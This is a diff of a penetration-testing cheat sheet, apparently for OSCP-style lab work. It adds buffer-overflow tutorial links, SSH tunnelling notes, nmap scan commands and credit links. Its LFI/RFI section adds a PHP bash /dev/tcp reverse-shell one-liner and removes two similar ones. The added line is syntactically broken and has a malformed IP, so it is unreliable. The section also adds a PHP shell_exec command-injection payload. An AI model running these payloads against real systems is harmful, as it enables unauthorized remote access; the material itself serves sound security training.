@@ -21,13 +21,19 @@ I have tried to give as much credit to the original creator as possible, if I ha
 
 ## BOF (WIP)
 ----------------
-(Bad Characters: 0x00, 0x0A)
+(Typical bad characters include: 0x00, 0x0A, 0x0D)
 - Fuzzing
 - Finding eip position
 - Finding bad chars
 - Locating jmp esp
 - Generating payload with msfvenom
 - Getting reverse shell with netcat
+
+Good BOF resources: 
+- https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/
+- https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+- https://github.com/justinsteven/dostackbufferoverflowgood
+- https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/
 
 ## DNS - Zone Transfers
 ----------------
@@ -116,9 +122,12 @@ Kerberoasting
 
 LFI / RFI
 ----------------
-- _<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'");
-- _<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
-- Refer to LFI / RFI section at the top of the page ^^
+PHP Reverse Shell:
+<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");
+
+Command Injection:
+<?php echo shell_exec(whoami);?>
+- For more info on LFI & RFI please refer to the LFI / RFI section at the top of the page ^
 
 MSSQL / SQLi
 ----------------
@@ -204,6 +213,19 @@ Post Exploitation
 
 Port Forwarding
 ----------------
+
+```
+• Local -- Forward local port to remote host.
+• Remote -- Forward remote port to local host.
+• Dynamic -- Use SOCKS.
+
+Use local if you have a service running on a machine that can be reached from the remote machine, and you want to access it directly from the local machine. After setting up the tunneling you will be able to access the service using your local host IP (127.0.0.1)
+
+Use remote if you have a service that can be reached from the local machine, and you need to make it available to the remote machine. It opens the listening socket on the machine you have used SSH to log into. 
+
+Dynamic is like local, but on the client side it behaves like a SOCKS proxy. Use it if you need to connect with a software that expects SOCKS forwarding.
+```
+
 #Chisel
 local system:
 ```
@@ -229,6 +251,7 @@ Port Scanning
 - nmap -sT -p 22,80,110 -A 
 - nmap -p- -iL ips.txt > TCP_Ports.txt 
 - nc -v -n -z -w1 10.10.10.10 1-10000
+- nmap -p- -iL ips.txt > AllTCPPorts.txt
 
 #UDP (can take hours so maybe netstat is a better alternative)
 - nmap -sU --top-ports 10000
@@ -245,6 +268,10 @@ nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt
 
 #SSL
 nmap -v -v  --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt 
+
+NMAP Bootstrap Report
+nmap -oA poison --stylesheet nmap-bootstrap.xsl 10.10.10.10
+firefox nmap-bootstrap.xsl
 
 Ping Sweep
 ----------------
@@ -543,3 +570,6 @@ Thank you:
 # Thanks to these people for including my cheatsheet on their site/page:
 - https://khaoticdev.net/cheatsheets/#ad
 - https://www.facebook.com/ncybersec/posts/1541830509321001
+- https://www.facebook.com/cyberg0100/posts/github-sinfulzjusttryharder-justtryharder-a-cheat-sheet-which-will-aid-you-throu/653235345249466
+- https://www.reddit.com/r/CyberSpaceVN/comments/f3n2wp/github_sinfulzjusttryharder_justtryharder_a_cheat
+- https://xn4k.github.io/pentest/PWK-course-&-the-OSCP-Exam-Cheatsheet/
